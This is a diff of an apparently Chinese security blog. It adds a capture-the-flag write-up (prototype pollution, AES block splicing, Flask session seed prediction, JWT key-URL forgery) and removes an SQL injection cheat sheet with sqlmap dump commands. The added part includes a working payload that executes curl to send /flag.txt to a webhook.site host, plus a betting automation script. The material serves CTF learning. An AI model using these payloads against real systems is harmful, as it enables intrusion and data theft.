+    // E.g. if the input is vinegar.type=mL it will set
+    // &#123;&quot;vinegar&quot;: &#123;&quot;type&quot;: &quot;mL&quot;&#125;&#125; in the baseIngredients variable
+    const ingredientName = split[0]
+    if (typeof baseIngredients[ingredientName] === &quot;undefined&quot;) &#123;
+        baseIngredients[ingredientName] = &#123;&#125;
+    &#125;
+    const ingredientAttribute = split[1];
+    // Should be completely secure doing this???
+    // I don&#39;t think the hoomans can pollute anything by assigning attributes this way
+    // Yeah I am pretty sure this is not vulnerable to prototype pollution
+    // I am not merging anything right???
+    baseIngredients[ingredientName][ingredientAttribute] = userInput[key];
+&#125;
+</code></pre>
+<p>虽然代码里没有&#96;&#96;merge<code>或者</code>clone<code>等函数，但</code> baseIngredients[ingredientName][ingredientAttribute] &#x3D; userInput[key];<code>进行了两个数组之间的赋值操作，效果等同于进行了</code>clone&#96;,存在原型链污染。再根据题目描述的传参方式进行构造：</p>
+<pre><code>GET /?__proto__.escapeFunction=JSON.stringify; process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl -F flag=@/flag.txt https://webhook.site/a120d04a-6263-4083-a587-33d4e08a2b6a&#39;)&amp;__proto__.client=true
+</code></pre>
+<p>拿到<code>flag.txt</code>：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png" alt="image-20240428085406716"></p>
+<p>下载获得<code>flag</code>:</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png" alt="image-20240428085508241"></p>
+<h2 id="Advanced-Emu-Standard"><a href="#Advanced-Emu-Standard" class="headerlink" title="Advanced Emu Standard"></a>Advanced Emu Standard</h2><p><code>AES-128</code>会将原文16位为一组进行加密，不满16也会当成16位去进行加密，所以我们可以将<code>deactivate_special_procedure_123</code>分为两部分<code>deactivate_speci</code>和<code>al_procedure_123</code>,分别对他们进行加密，然后拼接即为答案：</p>
+<pre><code>deactivate_speci  Encryptor: 3155433d53ed30c89aef89b2e7273924
+al_procedure_123  Encryptor: 4127efafc809cc1209376d039e0001f1
 
-不用逗号
+Transmit encrypted command: 3155433d53ed30c89aef89b2e72739244127efafc809cc1209376d039e0001f1
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png" alt="image-20240428084447502"></p>
+<h2 id="Emu-Cook-Book"><a href="#Emu-Cook-Book" class="headerlink" title="Emu Cook Book"></a>Emu Cook Book</h2><p>一条龙解密</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png" alt="image-20240428143720534"></p>
+<h2 id="Emu-Casino"><a href="#Emu-Casino" class="headerlink" title="Emu Casino"></a>Emu Casino</h2><p>根据给出的<code>py</code>脚本可知，随机数种子与<code>session_id</code>和<code>round</code>有关，而这两个的值都保存在<code>cookie</code>的session字段内。<code>flask</code>的<code>session</code>为三段<code>base64</code>编码的数据组成，利用工具查看发现，第一段数据解码后就包含我们想要的数据：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png" alt="image-20240428103936811"></p>
+<p>抓包看数据的发送过程：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png" alt="image-20240428104023953"></p>
+<p>在<code>/submit-bet</code>路由下发送一个<code>json</code>数据，我们可以在<code>Set-Cookie</code>中获取下一次使用的<code>cookie</code>，由此就可以写出自动化脚本：</p>
+<pre><code class="python">from random import choice, seed
+import base64
+import json
+import requests
+def flip_coin(session_id,round):
+    seed(str(round) + &quot;_&quot; + session_id)
+    return choice([&quot;tails&quot;, &quot;heads&quot;])
+sess=&quot;eyJjcmVkaXRzIjoxMCwicm91bmQiOjEsInNlc3Npb25faWQiOiIyZGE0MDYwMzQyM2JmODViOGJjMDllNGY1YzI5ZGU1ZSJ9.Zi2q9A.3KuBz5eDx7_HylaUEBWxT5RS6nU&quot;
+while True:
+    url=&quot;http://34.87.251.234:3000/submit-bet&quot;
+    cookie=&#123;&quot;session&quot;:sess&#125;
+    seq=cookie[&quot;session&quot;].split(&quot;.&quot;)[0]
+    while len(seq)%4!=0:
+        seq+=&quot;=&quot;
+    jwt=json.loads(base64.urlsafe_b64decode(seq))
+    if jwt[&quot;credits&quot;]&gt;=10000:
+        a=requests.get(&quot;http://34.87.251.234:3000/&quot;,cookies=cookie)
+        print(a.text)
+        break
+    a=requests.post(url,cookies=cookie,json=&#123;&quot;bet_amount&quot;:jwt[&#39;credits&#39;],&quot;bet_choice&quot;:flip_coin(jwt[&quot;session_id&quot;],jwt[&#39;round&#39;])&#125;)
+    print(a.text)
+    sess=a.headers[&#39;set-Cookie&#39;].split(&quot;;&quot;)[0].replace(&quot;session=&quot;,&#39;&#39;)
+    print(sess)
+</code></pre>
+<p>最后拿到flag：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png" alt="image-20240428104245922"></p>
+<h2 id="EWT"><a href="#EWT" class="headerlink" title="EWT"></a>EWT</h2><p>拿到源码后进行分析，发现关键函数：</p>
+<pre><code class="js">async function validateJwt(jwtToken) &#123;
+    // We want to allow Emus to use both HS256 and RS256 signing algos
+    const decodedJwt = jwt.decode(jwtToken, &#123;complete: true&#125;);
+    if ( !decodedJwt ) &#123;
+        throw Error(&quot;where JWT at??&quot;)
+    &#125;
+    const decodedHeader = decodedJwt.header, decodedBody = decodedJwt.payload;
+    const signingAlgo = decodedHeader.alg;
 
-?id=-1&#39; union select * from (select 1)a join (select 2)b join (select 3)c--+
-</code></pre>
-<h4 id="⑫过滤函数绕过"><a href="#⑫过滤函数绕过" class="headerlink" title="⑫过滤函数绕过"></a>⑫过滤函数绕过</h4><p>·sleep() –&gt;benchmark()</p>
-<p>·ascii()–&gt;hex()、bin()<br>替代之后再使用对应的进制转string即可</p>
-<p>·group_concat()–&gt;concat_ws()</p>
-<p>·substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p>
-<p>·user() –&gt; @@user、datadir–&gt;@@datadir</p>
-<p>·ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p>
-<p>·information_schema.tables-&gt;mysql.innodb_table_stats &#x2F; mysql.innodb_index_stats表下分别是database_name,table_name,index_name</p>
-<p>sys数据库中的以下三个视图中存储了表名table_name:</p>
-<ul>
-<li>sys.schema_auto_increment_columns #存在自增主键的表会出现在此视图</li>
-<li>sys.schema_table_statistics_with_buffer #数据来源视图</li>
-<li>sys.x$schema_table_statistics_with_buffer #数据来源视图</li>
-</ul>
-<p>（注：部分内容借鉴于这位大佬的博客<a target="_blank" rel="noopener" href="https://huanghelouzi.blog.csdn.net/article/details/82995313?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscan_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscan_v2&utm_relevant_index=2">点我跳转</a>）</p>
-<h3 id="六、sqlmap工具的使用"><a href="#六、sqlmap工具的使用" class="headerlink" title="六、sqlmap工具的使用"></a>六、sqlmap工具的使用</h3><h4 id="①检查注入点："><a href="#①检查注入点：" class="headerlink" title="①检查注入点："></a>①检查注入点：</h4><p>sqlmap -u <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11</p>
-<h4 id="②爆所有数据库信息："><a href="#②爆所有数据库信息：" class="headerlink" title="②爆所有数据库信息："></a>②爆所有数据库信息：</h4><p>sqlmap -u <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –dbs</p>
-<h4 id="③爆当前数据库信息："><a href="#③爆当前数据库信息：" class="headerlink" title="③爆当前数据库信息："></a>③爆当前数据库信息：</h4><p>sqlmap -u <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –current-db</p>
-<h4 id="④指定库名列出所有表"><a href="#④指定库名列出所有表" class="headerlink" title="④指定库名列出所有表"></a>④指定库名列出所有表</h4><p>sqlmap -u <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 –tables</p>
-<p>‘vhost48330’ 为指定数据库名称</p>
-<h4 id="⑤指定库名表名列出所有字段"><a href="#⑤指定库名表名列出所有字段" class="headerlink" title="⑤指定库名表名列出所有字段"></a>⑤指定库名表名列出所有字段</h4><p>sqlmap -u <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin –columns<br> ‘admin’ 为指定表名称</p>
-<h4 id="⑥指定库名表名字段dump出指定字段"><a href="#⑥指定库名表名字段dump出指定字段" class="headerlink" title="⑥指定库名表名字段dump出指定字段"></a>⑥指定库名表名字段dump出指定字段</h4><p>sqlmap -u <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin -C ac，id，password –dump<br> ‘ac,id,password’ 为指定字段名称</p>
-<h3 id="七、handler命令与实现方法"><a href="#七、handler命令与实现方法" class="headerlink" title="七、handler命令与实现方法"></a>七、handler命令与实现方法</h3><pre><code class="sql">HANDLER tbl_name OPEN [ [AS] alias]
-HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
-HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]
-HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]
-HANDLER tbl_name CLOSE
-</code></pre>
-<h3 id="八、无列名注入"><a href="#八、无列名注入" class="headerlink" title="八、无列名注入"></a>八、无列名注入</h3><p>创建一数据库中含有user表如下：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-1fc7b292ad2553ed.webp" alt="20163356-1fc7b292ad2553ed"></p>
-<p>正常查询：</p>
-<pre><code class="csharp">mysql&gt; select * from user;
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-53af3c91b3df5400.png" alt="img"></p>
-<p>使用union查询：</p>
-<pre><code class="csharp">mysql&gt; select 1,2,3 union select * from user;
-</code></pre>
-<img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-3fc279ccfaf5e770.webp" alt="20163356-3fc279ccfaf5e770" style="zoom:150%;" />
+    // We only allow HS256 or RS256 signing algos
+    if (![&quot;HS256&quot;, &quot;RS256&quot;].includes(signingAlgo)) &#123;
+        throw Error(&quot;invalid algorithm in JWT&quot;);
+    &#125;
 
-<p>利用数字3代替未知的列名，需要加上反引号。后面加了一个a是为了表示这个表（select 1,2,3 union select * from user）的别名，不然会报错。</p>
-<pre><code class="csharp">mysql&gt; select `3` from (select 1,2,3 union select * from user)a;
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-fc946d14dc03da42.png" alt="img"></p>
-<p>当 &#96; 不能使用时，用别名来代替：</p>
-<pre><code class="csharp">mysql&gt; select b from (select 1,2,3 as b union select * from user)a;
-</code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-a59b62459ffef58f.png" alt="img"></p>
-<p>利用join：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/1678972-20200505234437885-766004809.png" alt="img"></p>
-<h3 id="九、预处理"><a href="#九、预处理" class="headerlink" title="九、预处理"></a>九、预处理</h3><h3 id="MySQL传统处理："><a href="#MySQL传统处理：" class="headerlink" title="MySQL传统处理："></a>MySQL传统处理：</h3><pre><code>客户端准备sql语句
+    key = SECRET_KEY;
 
-发送sql语句到MySQL服务器
+    if (signingAlgo === &quot;RS256&quot;) &#123;
+        // Grab where the RS256 public key URL from the &quot;iss&quot; claim in the JWT body
+        // We currently haven&#39;t figured out how to sign our own RS256 JWTs yet...
+        const issuerUrl = decodedBody.iss;
 
-MySQL服务器执行sql语句
+        // Make sure those hoomans aren&#39;t hacking with something like file://
+        const regExp = new RegExp(&quot;^https?://&quot;);
+        if (!regExp.test(issuerUrl)) &#123;
+            throw Error(&quot;invalid URL in iss claim&quot;);
+        &#125;
+        
+        // Should be fine to download the public key
+        key = await downloadFromUrl(issuerUrl);
+    &#125;
 
-服务器执行结果返回客户端
+    // Verify the JWT token
+    return jwt.verify(jwtToken, key);
+&#125;
 </code></pre>
-<h3 id="预处理基本策略："><a href="#预处理基本策略：" class="headerlink" title="预处理基本策略："></a>预处理基本策略：</h3><pre><code>将sql语句强制一分为二：
-第一部分为前面相同命令和结构部分
-第二部分为后面可变数据部分
-首先将前面的sql语句发送给MySQL服务器，让其先执行溢出预处理（并没有真正的执行）第一次发送sql语句的时候将其中可变的数据部
-</code></pre>
-<h3 id="不带参数的预处理"><a href="#不带参数的预处理" class="headerlink" title="不带参数的预处理"></a>不带参数的预处理</h3><p><strong>准备预处理语句</strong></p>
-<p>prepare 语句名称 from “预处理的sql语句”;</p>
-<pre><code class="sql">prepare sql_1 from &quot;select * from pdo&quot;;
-</code></pre>
-<p><strong>执行预处理语句</strong></p>
-<pre><code class="sql">execute sql_1;
-</code></pre>
-<p><strong>删除预处理语句</strong></p>
-<pre><code class="sql">drop prepare sql_1;
-</code></pre>
-<h3 id="带参数的预处理"><a href="#带参数的预处理" class="headerlink" title="带参数的预处理"></a>带参数的预处理</h3><p><strong>准备预处理语句</strong></p>
-<pre><code class="sql">prepare sql_2 from &quot;select * from pdo where id = ?&quot;;
-</code></pre>
-<p><strong>定义参数变量</strong></p>
-<pre><code class="sql">set @id=2;
-</code></pre>
-<p><strong>传参，执行预处理</strong></p>
-<pre><code class="sql">execute sql_2 using @id; 
-</code></pre>
-<p><strong>删除</strong></p>
-<pre><code class="sql">drop prepare sql_2;
-</code></pre>
+<p>要求加密算法必须为<code>RS256</code>或者<code>HS256</code>,而这里提供了若为<code>RS256</code>算法，可从url远程下载<code>public key</code>的方式，我们就可以根据该种方式生成<code>token</code>拿到flag。在<a target="_blank" rel="noopener" href="https://jwt.io/%E8%BF%9B%E8%A1%8C%E6%9E%84%E9%80%A0%EF%BC%9A">https://jwt.io/进行构造：</a></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png" alt="image-20240428142339778"></p>
+<p>将<code>public key</code>存储在服务器web目录下的<code>	key</code>文件内，<code>iss</code>的值为其地址，因为不太会用<code>pastbin</code>的纯文本分享我就丢自己的服务器上了。将生成的<code>token</code>拿去提交成功拿到<code>flag</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png" alt="image-20240428142823544"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
